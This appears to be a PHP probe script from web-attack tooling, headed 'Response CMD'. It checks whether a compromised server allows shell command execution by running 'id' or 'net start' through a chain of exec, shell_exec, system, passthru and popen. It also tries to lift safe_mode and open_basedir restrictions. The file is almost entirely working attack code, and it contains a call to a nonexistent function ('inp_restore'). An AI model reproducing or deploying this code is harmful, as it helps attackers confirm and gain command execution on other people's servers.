<html><head><title>/\/\/\ Response CMD /\/\/\</title></head><body bgcolor=DC632C>
<H6>Changing this CMD will result in corrupt scanning !</H6>
</html></head></body>
<?php
if((@eregi("uid",ex("id"))) || (@eregi("Windows",ex("net start")))){
echo("Safe Mode of this Server is : ");
echo("SafeOFF");
}
else{
ini_restore("safe_mode");
inp_restore("open_basedir");
if((@eregi("uid",ex("id"))) || (@eregi("Windows",ex("net start")))){
echo("Safe Mode of this Server is : ");
echo("SafeOFF");
}else{
echo("Safe Mode of this Server is : ");
echo("SafeON");
}
}
function ex($cfe){
$res = '';
if (!empty($cfe)){
if(function_exists('exec')){
@exec($cfe,$res);
$res = join("\n",$res);
}
elseif(function_exists('shell_exec')){
$res = @shell_exec($cfe);
}
elseif(function_exists('system')){
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(function_exists('passthru')){
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(@is_resource($f = @popen($cfe,"r"))){
$res = "";
while(!@feof($f)) { $res .= @fread($f,6013); }
@pclose($f);
}
}
return $res;
}
exit;
?>